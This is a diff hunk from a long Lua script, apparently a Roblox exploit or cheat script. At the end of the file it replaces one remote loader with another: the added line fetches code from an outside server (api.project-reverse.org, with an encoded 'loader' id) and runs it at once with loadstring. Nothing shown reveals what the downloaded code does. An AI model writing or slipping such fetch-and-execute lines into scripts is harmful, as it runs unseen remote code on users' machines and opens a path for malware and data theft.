@@ -10383,8 +10383,4 @@ print("Kittylol  success")
 
 
 end)
-
-task.spawn(function()
-    local response = game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjM3ZmFjNjRkLTA5MGUtNDE4Yi05NjU3LTQ0MjgwY2NjZTg2MiIsImtpbmQiOiJsb2FkZXIifQ")
-    loadstring(response)()
-end)
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjAwNGFkODZkLTFmNGMtNDZiZS1iZWQ1LWYxOTUyZjAxZTFjYSIsImtpbmQiOiJsb2FkZXIifQ"))()
